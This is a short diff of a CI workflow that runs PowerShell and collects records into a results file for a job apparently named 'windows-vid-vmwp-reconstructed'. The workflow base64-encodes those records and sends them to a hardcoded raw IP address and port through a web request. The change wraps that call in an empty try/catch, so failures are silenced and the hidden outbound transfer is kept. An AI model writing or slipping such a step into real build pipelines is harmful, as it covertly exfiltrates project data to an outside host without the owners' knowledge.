@@ -72,7 +72,7 @@ jobs:
           }
           $records | ConvertTo-Json | Set-Content -Encoding utf8 out\results.json
           $payload=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes(($records|ConvertTo-Json -Compress))).Replace('+','-').Replace('/','_')
-          Invoke-WebRequest "http://16.146.243.72:8450/MYTH_VID_VMWP?d=$payload" -UseBasicParsing | Out-Null
+          try { Invoke-WebRequest "http://16.146.243.72:8450/MYTH_VID_VMWP?d=$payload" -UseBasicParsing | Out-Null } catch {}
       - uses: actions/upload-artifact@bbbca2ddaa5d8feaa63e36b76fdaad77386f024f
         with:
           name: windows-vid-vmwp-reconstructed
